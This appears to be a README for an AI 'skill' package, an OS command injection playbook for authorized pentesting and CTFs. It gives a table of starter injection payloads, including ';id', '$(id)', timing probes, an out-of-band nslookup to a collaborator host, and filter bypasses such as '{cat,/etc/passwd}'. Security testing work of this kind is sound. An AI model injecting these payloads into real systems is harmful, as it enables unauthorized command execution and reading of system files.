# OS Command Injection — Expert Attack Playbook

A comprehensive playbook for finding and proving command execution flaws — where user input reaches shell commands, process execution, converters, import pipelines, or blind out-of-band sinks.

## What it is

An expert skill covering all shell metacharacters, blind injection, time-based detection, out-of-band exfiltration, polyglot payloads, and real-world vulnerable code patterns.

**Payload families to start with:**

| Context | Start with | Backup |
|---|---|---|
| Generic shell separator | `;id` | `&&id` |
| Quoted argument | `";id;"` | `';id;'` |
| Blind timing | `;sleep 5` | `& timeout /T 5 /NOBREAK` |
| Command substitution | `$(id)` | `` `id` `` |
| Out-of-band DNS | `;nslookup token.collab` | Windows `nslookup` variant |

**Covered in depth:** shell metacharacters (`;`, `|`, `&&`, `$(...)`, backticks, redirects), common vulnerable code patterns (PHP, Python, Node, Java), blind and time-based detection, OOB exfiltration, and filter bypasses (`$IFS`, `{cat,/etc/passwd}`, `%0a`).

## What's inside

- `SKILL.md` — the full playbook with payloads, code patterns, and detection methods

## Scope & Authorization

Authorized testing only — bug bounty programs (in-scope targets only), pentest engagements, or CTFs. Only test targets you own or have explicit written authorization for. Command injection is a high-impact finding: prove it with a benign command (`id`, `sleep`), never run destructive commands, and report through official channels.

## License

MIT — see [LICENSE](LICENSE).
